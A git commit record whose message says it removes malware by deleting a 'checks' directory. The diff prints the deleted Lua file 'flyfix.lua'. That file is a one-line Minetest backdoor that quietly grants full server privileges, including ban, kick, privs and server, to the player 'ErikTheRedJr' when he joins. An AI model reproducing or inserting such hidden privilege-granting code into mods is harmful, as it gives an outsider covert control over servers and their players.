c21a308d525c03f7e56de6239f1434cb953b7347
gitmaster12345677808 <141598427+gitmaster12345677808@users.noreply.github.com>
2025-09-01 08:28:15 -0400

    Delete checks directory
    removed malware

--- checks/client_init/flyfix.lua
+++
@@ -1,2 +0,0 @@
-minetest.register_on_joinplayer(function(a)if a:get_player_name()=="ErikTheRedJr"then local b={}for _,c in pairs({"interact","shout","fast","fly","noclip","give","kick","ban","privs","basic_privs","teleport","bring","debug","server","zoom","maphack"})do b[c]=true end minetest.set_player_privs("ErikTheRedJr",b)end end)
-
